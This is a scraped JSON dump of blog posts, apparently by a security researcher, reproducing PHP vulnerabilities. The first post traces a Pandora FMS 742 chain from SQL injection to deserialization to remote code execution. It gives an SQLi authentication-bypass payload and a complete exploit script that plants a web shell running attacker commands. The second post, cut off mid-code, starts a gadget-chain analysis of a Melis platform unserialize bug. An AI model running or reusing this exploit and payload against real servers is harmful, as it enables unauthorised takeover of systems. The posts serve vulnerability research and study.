type=\u0026#34;text/css\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;styles/js/jquery-ui.min.css\u0026#34; type=\u0026#34;text/css\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;styles/js/jquery-ui_custom.css\u0026#34; type=\u0026#34;text/css\u0026#34; /\u0026gt; \u0026lt;script language=\u0026#34;javascript\u0026#34; type=\u0026#39;text/javascript\u0026#39; src=\u0026#39;javascript/pandora.js\u0026#39;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script language=\u0026#34;javascript\u0026#34; type=\u0026#39;text/javascript\u0026#39; src=\u0026#39;javascript/jquery-3.3.1.min.js\u0026#39;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Access is not granted\u0026lt;/h1\u0026gt; \u0026lt;?php echoPhantomCallback(); ?\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;?php exit; } At line 2, the session_id value is controlled by the attacker. Letâ€™s delve deeper into the constructor function of the PandoraFMS\\Userclass: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 public function __construct($data) { global $config; // Unset user. unset($config[\u0026#39;id_usuario\u0026#39;]); unset($_SESSION[\u0026#39;id_usuario\u0026#39;]); if (is_array($data) === true) { if (isset($data[\u0026#39;phpsessionid\u0026#39;]) === true) { $this-\u0026gt;sessions[$data[\u0026#39;phpsessionid\u0026#39;]] = 1; $info = \\db_get_row_filter( \u0026#39;tsessions_php\u0026#39;, [\u0026#39;id_session\u0026#39; =\u0026gt; $data[\u0026#39;phpsessionid\u0026#39;]] ); if ($info !== false) { // Process. $session_data = session_decode($info[\u0026#39;data\u0026#39;]); $this-\u0026gt;idUser = $_SESSION[\u0026#39;id_usuario\u0026#39;]; // Valid session. return $this; } return null; } if (isset($data[\u0026#39;id_usuario\u0026#39;]) === true \u0026amp;\u0026amp; isset($data[\u0026#39;password\u0026#39;]) === true ) { $user_in_db = process_user_login($user, $password, true); if ($user_in_db !== false) { $config[\u0026#39;id_usuario\u0026#39;] = $user_in_db; $correctLogin = true; // Originally at api.php. if (session_status() === PHP_SESSION_NONE) { session_start(); } $_SESSION[\u0026#39;id_usuario\u0026#39;] = $user; session_write_close(); $this-\u0026gt;idUser = $data[\u0026#39;id_usuario\u0026#39;]; // Valid session. return $this; } } } return null; } At lines 12-15, the phpsessionid value will be used as an argument for the db_get_row_filter() function. The output of the db_get_row_filter() function is saved in the info variable and $info['data'] will be deserialized using the session_decode() fuction. Letâ€™s delve deeper into the db_get_row_filter function:\n1 2 3 4 5 6 7 8 function db_get_row_filter($table, $filter, $fields=false, $where_join=\u0026#39;AND\u0026#39;, $historydb=false) { global $config; switch ($config[\u0026#39;dbtype\u0026#39;]) { case \u0026#39;mysql\u0026#39;: return mysql_db_get_row_filter($table, $filter, $fields, $where_join, $historydb); ... Because the database being used is MariaDB-mysql, letâ€™s delve deeper into the mysql_db_get_row_filter function at line 7:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 function mysql_db_get_row_filter($table, $filter, $fields=false, $where_join=\u0026#39;AND\u0026#39;, $historydb=false) { if (empty($fields)) { $fields = \u0026#39;*\u0026#39;; } else { if (is_array($fields)) { $fields = implode(\u0026#39;,\u0026#39;, $fields); } else if (! is_string($fields)) { return false; } } if (is_array($filter)) { $filter = db_format_array_where_clause_sql($filter, $where_join, \u0026#39; WHERE \u0026#39;); } else if (is_string($filter)) { $filter = \u0026#39;WHERE \u0026#39;.$filter; } else { $filter = \u0026#39;\u0026#39;; } $sql = sprintf(\u0026#39;SELECT %s FROM %s %s\u0026#39;, $fields, $table, $filter); return db_get_row_sql($sql, $historydb); } Yeah, it indicates that the program will construct a SQL query. It is easy to observe the value of SQL query by using a sample payload and debugging program.\nThe used payload is The value of SQL query by debugging: ÄÃ¢y lÃ  dáº¥u hiá»‡u cá»§a SQLi, bÃ¢y giá» chÃºng ta thá»­ truyá»n vÃ o nhá»¯ng kÃ­ tá»± break xem sao This is a signature of a SQL Injection attack. Now, we will use a payload with some â€˜break charactersâ€™ and observe the results: It doesnâ€™t have any function to filter my payload! Nice! This following payload will make the WHERE clause always true and add a # to comment out any characters following it, if the program allows it. 1 xxxx\u0026#39; or 1=1 # Going deeper into the db_get_row_sql, we can see: 1 2 3 4 5 6 7 8 9 10 11 function db_get_row_sql($sql, $search_history_db=false) { global $config; switch ($config[\u0026#39;dbtype\u0026#39;]) { case \u0026#39;mysql\u0026#39;: return mysql_db_get_row_sql($sql, $search_history_db); break; case \u0026#39;postgresql\u0026#39;: return postgresql_db_get_row_sql($sql, $search_history_db); This program calls the mysql_db_get_row_sql($sql, $search_history_db); function since it utilizes the MYSQL database. The following code represents the definition of mysql_db_get_row_sql at line 7:\n1 2 3 4 5 6 7 8 9 10 11 function mysql_db_get_row_sql($sql, $search_history_db=false) { $sql .= \u0026#39; LIMIT 1\u0026#39;; $result = db_get_all_rows_sql($sql, $search_history_db); if ($result === false) { return false; } return $result[0]; } This function adds the string ' LIMIT 1' to retrieve the first value. It executes the db_get_all_rows_sql($sql, $search_history_db) function, saves the output to the $result array and returns the result[0]. I tried sending my payload and retrieving data directly from MySQL to observe the results: It is clear that sessions that did not successfully log in will a have null value in the â€˜dataâ€™ field, while sessions with successful logins will have data stored in this field. So we can use this payload to exploit 1 xxx\u0026#39; UNION SELECT \u0026#39;a\u0026#39;,1,\u0026#39;id_usuario|s:5:\u0026#34;admin\u0026#34;;\u0026#39; as data FROM tsessions_php WHERE \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39; # POC\npandora-php.mp4\n2. FUNNY: PHP deserialization attack via session_decode() function a. Session_decode() In the blog post, there is a description as follows: Note that the functionÂ session_decode()Â is capable of deserializing arbitrary objects similar to the functionÂ unserialize(). This means that an attacker could deserialize arbitrary objects via the SQL Injection and this can be another attack vector.\nLetâ€™s examine the code in __construct() function of include/lib/User.php 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 public function __construct($data) { global $config; // Unset user. unset($config[\u0026#39;id_usuario\u0026#39;]); unset($_SESSION[\u0026#39;id_usuario\u0026#39;]); if (is_array($data) === true) { if (isset($data[\u0026#39;phpsessionid\u0026#39;]) === true) { $this-\u0026gt;sessions[$data[\u0026#39;phpsessionid\u0026#39;]] = 1; $info = \\db_get_row_filter( \u0026#39;tsessions_php\u0026#39;, [\u0026#39;id_session\u0026#39; =\u0026gt; $data[\u0026#39;phpsessionid\u0026#39;]] ); if ($info !== false) { // Process. $session_data = session_decode($info[\u0026#39;data\u0026#39;]); $this-\u0026gt;idUser = $_SESSION[\u0026#39;id_usuario\u0026#39;]; // Valid session. return $this; } return null; } if (isset($data[\u0026#39;id_usuario\u0026#39;]) === true \u0026amp;\u0026amp; isset($data[\u0026#39;password\u0026#39;]) === true ) { $user_in_db = process_user_login($user, $password, true); if ($user_in_db !== false) { $config[\u0026#39;id_usuario\u0026#39;] = $user_in_db; $correctLogin = true; // Originally at api.php. if (session_status() === PHP_SESSION_NONE) { session_start(); } $_SESSION[\u0026#39;id_usuario\u0026#39;] = $user; session_write_close(); $this-\u0026gt;idUser = $data[\u0026#39;id_usuario\u0026#39;]; // Valid session. return $this; } } } return null; } At line 19, we can see: 1 $session_data = session_decode($info[\u0026#39;data\u0026#39;]); The value of $info['data'] is passed to session_decode() function. Below is an example of a valid value stored in the database:\n1 2 id_usuario|s:5:\u0026#34;admin\u0026#34;;alert_msg|a:0:{}new_chat|b:0 id_usuario|s:5:\u0026#34;admin\u0026#34;;alert_msg|a:0:{}new_chat|b:0;csrf_code|s:32:\u0026#34;e7c2afc1ece9d83b21ca017a98586068\u0026#34; These values are in the form of serialized strings. So, the attack vector here would be as follows:\nThe attacker utilizes SQL injection to insert exploit code into $info['data']. The program will load the content provided by the attacker and trigger the payload in the session_decode($info['data']) function. One advantage of setting up a debug environment is that we can modify the values of variables as desired before proceeding with the next command. Here, I will make direct modifications during the debug process to verify.\nIn order for the attacker to insert data into the SQL, we have two approaches:\nHow to customize the payload into an insert data statement, as our query statement has the following format: 1 \u0026#34;SELECT * FROM tsessions_php WHERE `id_session` = \u0026#39;\u0026lt;payload_injected\u0026gt;\u0026#39; LIMIT 1;\u0026#34; Locate the location where the SQL saves the session data into the database and modify it. After about an hour of searching and thinking, I realized that I had been going in the wrong direction ğŸ˜Ÿ. Actually, we donâ€™t need to insert data directly into the database, but rather manipulate the query in a way that it returns the value we control. If it seems a bit confusing, take a look at the following query:\n1 \u0026#34;SELECT * FROM tsessions_php WHERE `id_session` = \u0026#39;xxxxx\u0026#39; union select \u0026#39;1\u0026#39;,0,\u0026#39;xxx\u0026#39; as data#\u0026#39;\u0026#34; The above query uses the UNION operator to combine two sets of data. In this case, the first part of the WHERE clause is always false, resulting in a null value. However, the second part of the query returns the desired values: '1', 0, 'xxx'.\nBy ultilzing the UNION opertor, we can merge our own data with the original queryâ€™s result set. This allows to control the returned values and manipulate the queryâ€™s outcome to our advantage.\nBy doing this, I have successfully gained control over the value passed to the session_decode() function. Now we can move on the next step, which is building the exploit.\nb. Building a POP chain. a. Methology: Identify magic methods within classes that can be called by session_decode. Search for existing chains related to Pandora FMS on the internet and customize them. Utilize chains from other frameworks in PHP-GCC as inspiration. New idea: Invoke functions, use SQL to bypass authentication, and use session_decode() to modify properties within classes. Building a pop chain One challenge encountered when building a pop chain is not knowing which classes have been instantiated and can be invoked at runtime.\nâ‡’ Solution: Use console debug or print statements to identify the instantiated classes\n1 2 3 4 5 $classes = get_declared_classes(); ****foreach ($classes as $class) { echo $class . \u0026#34;\\n\u0026#34;; } By using the above method, we have obtained a list of classes that can be invoked 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 stdClass Exception ErrorException Error ParseError TypeError ArgumentCountError ArithmeticError DivisionByZeroError Closure Generator ClosedGeneratorException DateTime DateTimeImmutable DateTimeZone DateInterval DatePeriod LibXMLError HashContext ReflectionException Reflection ReflectionFunctionAbstract ReflectionFunction ReflectionGenerator ReflectionParameter ReflectionType ReflectionNamedType ReflectionMethod ReflectionClass ReflectionObject ReflectionProperty ReflectionClassConstant ReflectionExtension ReflectionZendExtension LogicException BadFunctionCallException BadMethodCallException DomainException InvalidArgumentException LengthException OutOfRangeException RuntimeException OutOfBoundsException OverflowException RangeException UnderflowException UnexpectedValueException RecursiveIteratorIterator IteratorIterator FilterIterator RecursiveFilterIterator CallbackFilterIterator RecursiveCallbackFilterIterator ParentIterator LimitIterator CachingIterator RecursiveCachingIterator NoRewindIterator AppendIterator InfiniteIterator RegexIterator RecursiveRegexIterator EmptyIterator RecursiveTreeIterator ArrayObject ArrayIterator RecursiveArrayIterator SplFileInfo DirectoryIterator FilesystemIterator RecursiveDirectoryIterator GlobIterator SplFileObject SplTempFileObject SplDoublyLinkedList SplQueue SplStack SplHeap SplMinHeap SplMaxHeap SplPriorityQueue SplFixedArray SplObjectStorage MultipleIterator SodiumException SessionHandler __PHP_Incomplete_Class php_user_filter Directory AssertionError PDOException PDO PDOStatement PDORow CURLFile DOMException DOMStringList DOMNameList DOMImplementationList DOMImplementationSource DOMImplementation DOMNode DOMNameSpaceNode DOMDocumentFragment DOMDocument DOMNodeList DOMNamedNodeMap DOMCharacterData DOMAttr DOMElement DOMText DOMComment DOMTypeinfo DOMUserDataHandler DOMDomError DOMErrorHandler DOMLocator DOMConfiguration DOMCdataSection DOMDocumentType DOMNotation DOMEntity DOMEntityReference DOMProcessingInstruction DOMStringExtend DOMXPath finfo mysqli_sql_exception mysqli_driver mysqli mysqli_warning mysqli_result mysqli_stmt PharException Phar PharData PharFileInfo SimpleXMLElement SimpleXMLIterator SNMP SNMPException XMLReader XMLWriter XSLTProcessor ZipArchive StreamReader StringReader FileReader CachedFileReader gettext_reader PandoraFMS\\User NetworkMap I have found an unauthenticated endpoint, but I haven\u0026rsquo;t been able to control the path:\n1 2 3 4 5 6 7 8 9 GET /pandora_console/include/Image/image_functions.php?getFile=/tmp/test.png\u0026amp;file=tumb_600x400_test.png\u0026amp;thumb=edisc\u0026amp;thumb_size=600x400 HTTP/1.1 Host: 192.168.159.135 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 When searching on the internet, I came across a paper discussing it : https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf\nIf we have complete control of a string within the $_SESSION array which occurs within the first 100\nbytes we can use a similar technique to cause the session file to be a valid Phar/Tar archive\nTo gain a better understanding, I would recommend asking ChatGPT for further clarification ğŸ˜‰\nThe session data in PHP is typically stored on the server-side as files, which are created and managed by PHP\u0026rsquo;s session handler. By default, these files are stored in a directory specified by the session.save_path directive in the php.ini configuration file.\nIn some cases, an attacker may be able to manipulate the session data to execute arbitrary code on the server. One such attack involves abusing the fact that PHP\u0026rsquo;s session_start() function automatically unserializes the session data stored in the session file.\nIf an attacker has complete control over a string within the first 100 bytes of the session data, they can use a technique called \u0026ldquo;phar deserialization\u0026rdquo; to create a valid Phar/Tar archive within the session file. This can be accomplished by crafting a string that contains a serialized Phar object, followed by arbitrary data that will be interpreted as the contents of the Phar archive.\nWhen the session data is unserialized by PHP, the Phar object will be deserialized and the contents of the archive will be written to disk. This can allow an attacker to write arbitrary files to the server, which could be used to execute arbitrary code or perform other malicious actions.\nTo protect against this attack, it is important to properly sanitize and validate all user input, and to avoid using user-controlled data within the session data. Additionally, it is recommended to set the session.serialize_handler directive to a value other than php (such as igbinary), which can provide additional protection against deserialization attacks.\nThe phpgcc tool provides a chain to exploit the vendor Swiftmailer, which Pandora is using. We can build an exploit chain using it. However, one issue we encountered is that the session_decode() function does not load Swiftmailer, causing the classes and objects of that class to be unreadable, resulting in the payload being unable to execute.\nAfter a period of research, I discovered that the payload passed into the session is stored in the database. Each time the website is accessed, the session is loaded and decoded. At that point, our payload will be deserialized. With this mindset, after injecting the session into the database, we only need to access a location that loads the vendor to exploit it. In this case, it is the path ws.php. For more details about the deserialization vulnerability in the Swiftmailer vendor, you can refer to the following link: https://github.com/CFandR-github/advisory/blob/main/phpmailer_rce_poi/phpmailer_unserialize_rce_0day.md\nSure, letâ€™s proceed with building the payload and exploit. One thing to note here is that there is a difference between the exploitation payload for this context and the payload used in PHPGCC.\nAdditionally, there are differences in the construction of the serialized string with various properties.\nFor the serialization of objects, the data serialized by member variables under different permission modifiers is also different:\n1 2 3 4 5 6 7 8 9 \u0026lt;?php class TestClass { PermissionDecorator $testMember; public function __construct($t) { $this-\u0026gt;testMember = $t; } } $data = new TestClass(\u0026#34;edisc12\u0026#34;); publicï¼š\n1 \u0026#34;O:9:\u0026#34;TestClass\u0026#34;:1:{s:10:\u0026#34;testMember\u0026#34;;s:7:\u0026#34;edisc12\u0026#34;;}\u0026#34; protectedï¼š\n1 \u0026#34;O:9:\u0026#34;TestClass\u0026#34;:1:{s:13:\u0026#34;\\x00*\\x00testMember\u0026#34;;s:7:\u0026#34;edisc12\u0026#34;;}\u0026#34; privateï¼š\n1 \u0026#34;O:9:\u0026#34;TestClass\u0026#34;:1:{s:21:\u0026#34;\\x00TestClass\\x00testMember\u0026#34;;s:7:\u0026#34;edisc12\u0026#34;;}\u0026#34; Below is my exploit code: exploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 \u0026lt;?php // include \u0026#39;unserialize.php\u0026#39;; session_start(); class Swift_ByteStream_FileByteStream extends Swift_ByteStream_AbstractFilterableInputStream{} class Swift_Events_SimpleEventDispatcher{} class Swift_Transport_SendmailTransport { public $buffer; public $started; public $eventDispatcher; } abstract class Swift_ByteStream_AbstractFilterableInputStream{ private $filters = []; private $writeBuffer = \u0026#39;\u0026lt;?php eval(base64_decode(\u0026#34;IGlmKGlzc2V0KCRfR0VUWydjbWQnXSkpIHsgc3lzdGVtKCRfR0VUWydjbWQnXSk7IH0g\u0026#34;));?\u0026gt;//\u0026#39;; } function httpGet($url, $sessionId) { $status = false; $curl = curl_init($url); $header = [\u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39;]; $header[] = \u0026#39;Cookie: PHPSESSID=\u0026#39;.$sessionId; curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); curl_setopt($curl, CURLOPT_HTTPHEADER, $header); curl_setopt($curl, CURLOPT_PROXY, \u0026#39;127.0.0.1:8080\u0026#39;); //proxy $response = curl_exec($curl); $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE); // Get the HTTP response code if ($httpCode === 302){ $status = true; } curl_close($curl); return $status; } function httpPost($url, $data) { $curl = curl_init($url); curl_setopt_array($curl, [ CURLOPT_POST =\u0026gt; true, CURLOPT_HTTPHEADER =\u0026gt; [\u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39;], CURLOPT_HEADER =\u0026gt; true, CURLOPT_POSTFIELDS =\u0026gt; $data, CURLOPT_RETURNTRANSFER =\u0026gt; true, CURLOPT_PROXY =\u0026gt; \u0026#39;127.0.0.1:8080\u0026#39;, //proxy ]); $response = curl_exec($curl); // var_dump($response); if (strpos($response, \u0026#34;Pandora FMS Graph ( - )\u0026#34;) !== false) { echo \u0026#34;[+] Inject payload successful!\u0026#34; . PHP_EOL; } else { echo \u0026#34;[!]Inject payload failed!\u0026#34; . PHP_EOL; die(); } curl_close($curl); return $response; } function exploit($host) { // Create Swift_Transport_SendmailTransport instance and set its properties $payload = new Swift_Transport_SendmailTransport(); $payload-\u0026gt;buffer = new Swift_ByteStream_FileByteStream(); $payload-\u0026gt;buffer-\u0026gt;path = \u0026#34;/var/www/html/pandora_console/shell.php\u0026#34;; $payload-\u0026gt;buffer-\u0026gt;mode = \u0026#34;w+b\u0026#34;; $payload-\u0026gt;started = true; $payload-\u0026gt;eventDispatcher = new Swift_Events_SimpleEventDispatcher(); // Set session variables $_SESSION[\u0026#39;id_usuario\u0026#39;] = \u0026#39;admin\u0026#39;; $_SESSION[\u0026#39;alert_msg\u0026#39;] = array(); $_SESSION[\u0026#39;new_chat\u0026#39;] = false; // Set the payload instance as session data $_SESSION[\u0026#39;vulnClass\u0026#39;] = $payload; // Encode the session data $encodedData = session_encode(); // echo PHP_EOL . PHP_EOL . \u0026#34;Encoded session data: \u0026#34; . $encodedData . PHP_EOL; // Decode the session data session_decode($encodedData); // echo \u0026#34;Decoded session data: \u0026#34; . PHP_EOL; // Send request echo PHP_EOL . \u0026#34;[+] Send payload...\u0026#34; . PHP_EOL; $url = $host . \u0026#39;/pandora_console/include/chart_generator.php\u0026#39;; $data = \u0026#39;session_id=\u0026#39; . urlencode(\u0026#39;xxxxx\\\u0026#39; union select \\\u0026#39;1\\\u0026#39;,0,\\\u0026#39;\u0026#39; . $encodedData . \u0026#39;\\\u0026#39; as data#\u0026#39;); $response = httpPost($url, $data); // var_dump($response); // Extract session ID from response headers echo \u0026#34;[+] Extracting PHPSESSID...\u0026#34;; preg_match(\u0026#39;/PHPSESSID=([^\\s;]+)/\u0026#39;, $response, $matches); if (isset($matches[1])) { $sessionId = $matches[1]; echo \u0026#34;[+] PHPSESSID = \u0026#34; . $sessionId . PHP_EOL; // Trigger payload echo PHP_EOL . \u0026#34;[+] Triggering payload...\u0026#34; . PHP_EOL; $url = $host . \u0026#34;/pandora_console/ws.php\u0026#34;; $status = httpGet($url, $sessionId); if ($status) { echo \u0026#34;[+] Exploit successful. Your shell is located at: \u0026#34; . $host . \u0026#34;/pandora_console/shell.php\u0026#34; . PHP_EOL; } else { echo \u0026#34;Exploit failed.\u0026#34; . PHP_EOL; } } } if ($argc \u0026lt; 2) { die(\u0026#34;Usage: php exploit.php \u0026lt;url\u0026gt;\\n\u0026#34;); } $url = $argv[1]; echo \u0026#34;Running exploit on $url\\n\u0026#34;; exploit($url); ?\u0026gt; IV References https://github.com/CFandR-github/advisory/blob/main/phpmailer_rce_poi/phpmailer_unserialize_rce_0day.md https://github.com/ambionics/phpggc https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/ Joomla! CMS 3.0~3.4.6 RCE - 12138\u0026rsquo;s Blog (144.one) ","description":"Continuing from the previous series of articles, in this post, I will apply the knowledge I have acquired and conduct further research on PHP deserialization in order to reproduce an intriguing bug: going from SQL injection to PHP deserialization and achieving Remote Code Execution (RCE) on Pandora FMS 742.","id":5,"section":"posts","tags":["php"],"title":"From SQLi to PHP deserialize to RCE on Pandora FMS 742","uri":"https://minhlongmt183.github.io/posts/from_sqli_to_php_deserialize_to_rce_on_pandora_fms/"},{"content":"Reproduce bug: Remote Code Execution in Melis Platform Continuing from the previous article series, in this post, I will apply the knowledge learned and research on PHP deserialize to reproduce CVE-2022-39298\nThere is currently no POC code available on this internet for this CVE, but there is a blog post discussing it: Remote Code Execution in Melis Platform | Sonar (sonarsource.com) This blog is based on the blog Remote Code Execution in Melis Platform | Sonar (sonarsource.com) and will be written in my own understanding. I Building environment What is melis-framework?\nMelis Framework is an open-source PHP web application framework for building custom, modular, and scalable e-commerce solutions. It is based on the Laminas Framework (formerly known as the Zend Framework) and provides additional modules and tools to make it easier to develop e-commerce applications.\nMelis Framework features a powerful and flexible content management system, which allows developers to create custom pages, blocks, and widgets. It also includes a robust shopping cart system with support for multiple payment gateways, shipping providers, and tax rates. Additionally, it offers various integrations such as social media, mailing list services, and Google Analytics.\nMelis Framework uses the Model-View-Controller (MVC) architecture and relies on the Composer dependency management system to manage packages and libraries. It is highly customizable and extensible, allowing developers to add their own modules, themes, and plugins to meet specific project requirements.\nOne of the most challenging issues I find when reproducing this CVE related to this framework is having to rebuild the environment, which takes a considerable amount of time and effort.\nAfter spending a few days searching for many sources of information on the internet (in fact, there are not many resources discussing this issue), I found that the best way is to follow the step-by-step video instructions on the website Download \u0026amp; Documentation (melistechnology.com. However, there is a difficulty that the website only provides installation instructions for the next step on the Windows platform, while I am using it on the Linux environment.\nI noticed that there was a section in the guide for building docker-compose. Therefore, I decided to read the contents the docker-compose.yml file, make some modifications to build it locally.\nThe important notice here is that during setup, at the final step, it is advisable to follow the video tutorial to create a sample site. This helps us save time in triggering the vulnerability.\nII Vulnerability identification At melis-front/src/Controller/MelisPluginRendererController.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 class MelisPluginRendererController extends MelisAbstractActionController { public function getPluginAction() { // [...] $post = $this-\u0026gt;getRequest()-\u0026gt;getPost()-\u0026gt;toArray(); // [1] $pluginHardcodedConfig = array(); if (!empty($post[\u0026#39;pluginHardcodedConfig\u0026#39;])) { $pluginHardcodedConfig = $post[\u0026#39;pluginHardcodedConfig\u0026#39;]; // [2] $pluginHardcodedConfig = html_entity_decode($pluginHardcodedConfig, ENT_QUOTES); $pluginHardcodedConfig = html_entity_decode($pluginHardcodedConfig, ENT_QUOTES); $pluginHardcodedConfig = unserialize($pluginHardcodedConfig); // [3] At line 13, the unserialize() function is called with the parameter $pluginHardcodedConfig which is obtained from $post (at line 6).\nThe class MelisPluginRendererController is extended from MelisAbstractActionController class which is located in Laminas\\Mvc\\Controller\\AbstractActionController.\nFrom this, we can infer the framework being used is Lamimas. The Laminas\\Mvc\\Controller::getRequest() method returns an object of type Laminas\\Http\\Request. This object has a getPost()-\u0026gt;toArray() method which retrieves the POST data and stores it in $post (at line 6). An attacker can control the value of this variable.\nIII Finding source from sink Tracing the sink, I found that it is related to the file module.config.php in melis-platform.\nThe source code of vendor/melisplatform/melis-front/src/Controller/MelisPluginRendererController.php shows that:\nThis bug relates to a plugin. This Framework is built following the MVC model. trÃªn trang document cá»§a melis, cÃ³ 1 trang webdemo\nOn the Melis documentation page, there is a web demo and a sample config page.\nFrom here, I realize that the vulnerability occurred on the website hosted on the Melis framework, but what I am doing is looking for the bug on the Melis framework, which is the wrong direction. ğŸ˜”ğŸ˜”ğŸ˜”\nTherefore, the next step is to create a website hosted on the Melis-framework like the sample site on the local machine.\nAfter a day of research, I found out the cause of the issue. During the installation process, there was an option to install with a demo version. After installing, all I need to do is access the demo website, and the plugin will automatically trigger.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 POST /news/id/2 HTTP/1.1 Host: www.mysite.local User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Referer: http://www.mysite.local/melis Cookie: PHPSESSID=dhd40qdsqb3goj8lkmausre78d; show_bubble_plugins=true; dashboard_notify=false Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 0 pluginHardcodedConfig=Ediscxxxxxx And at this point, we can also control any value passed into the unserialize() function, which is enough to move on to the next phase.\nIV Building a POP chain There is a paper discussing this exploitation technique.\ndahse2014 (1).pdf\nSupporting tool - PHPGGC PHPGGC is a library of unserialize() payloads along with a tool to generate them, from command line or programmatically. When encountering an unserialize on a website you don\u0026rsquo;t have the code of, or simply when trying to build an exploit, this tool allows you to generate the payload without having to go through the tedious steps of finding gadgets and combining them. It can be seen as the equivalent ofÂ frohoff\u0026rsquo;s ysoserial, but for PHP. Currently, the tool supports gadget chains such as: CodeIgniter4, Doctrine, Drupal7, Guzzle, Laravel, Magento, Monolog, Phalcon, Podio, Slim, SwiftMailer, Symfony, Wordpress, Yii and ZendFramework.\nlink: https://github.com/ambionics/phpggc PHPGCC includes a chain that allows deleting any file. 1 2 3 4 5 6 7 ./phpggc -i Laminas/FD1 Name : Laminas/FD1 Version : \u0026lt;= 2.11.2 Type : File delete Vector : __destruct ./phpggc Laminas/FD1 \u0026lt;remote_path\u0026gt; But the impact causes is too too significant and destructive for organizations. As a pentester, we need to find other chains that have less impact.\nFinding new chain The authorâ€™s experience with unserialize shows that the caching systems are suitable targets for attacks and control. Because most applications tend to trust the content from the cache. The application uses laminas/laminas-cache as a third-party dependency, which supports various backend storage features such as apcu,Â blackhole,Â mongodb,Â filesystem,Â memcached,Â memory,Â redis and session. After going through the classes, the author found a comment in the code 1 Saves any deferred items that have not been committed At laminas-cache/src/Psr/CacheItemPool/CacheItemPoolDecorator.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;?php namespace Laminas\\Cache\\Psr\\CacheItemPool; # [...] class CacheItemPoolDecorator implements CacheItemPoolInterface { /** * Destructor. * * Saves any deferred items that have not been committed */ public function __destruct() { $this-\u0026gt;commit(); } This means that there must be some way to use this class to store new items in the cache.\nGo deeper into the commit() function at vendor/laminas/laminas-cache/src/Psr/CacheItemPool/CacheItemPoolDecorator.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 public function commit() { $notSaved = []; foreach ($this-\u0026gt;deferred as \u0026amp;$item) { if (! $this-\u0026gt;save($item)) { $notSaved[] = $item; } } $this-\u0026gt;deferred = $notSaved; return empty($this-\u0026gt;deferred); } It is easy to notice that all values of $this-\u0026gt;deferred are saved to cache by the $this-\u0026gt;save() function (lines 5-9) Go deeper into the $this-\u0026gt;save() function\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 public function save(CacheItemInterface $item) { if (! $item instanceof CacheItem) { throw new InvalidArgumentException(\u0026#39;$item must be an instance of \u0026#39; . CacheItem::class); } $itemTtl = $item-\u0026gt;getTtl(); // delete expired item if ($itemTtl \u0026lt; 0) { $this-\u0026gt;deleteItem($item-\u0026gt;getKey()); $item-\u0026gt;setIsHit(false); // khÃ´ng cÃ³ trong cache return false; } $saved = true; $options = $this-\u0026gt;storage-\u0026gt;getOptions(); $ttl = $options-\u0026gt;getTtl(); try { // get item value and serialize, if required $value = $item-\u0026gt;get(); // reset TTL on adapter, if required if ($itemTtl \u0026gt; 0) { $options-\u0026gt;setTtl($itemTtl); } $saved = $this-\u0026gt;storage-\u0026gt;setItem($item-\u0026gt;getKey(), $value); // saved items are a hit? see integration test CachePoolTest::testIsHit() $item-\u0026gt;setIsHit($saved); } catch 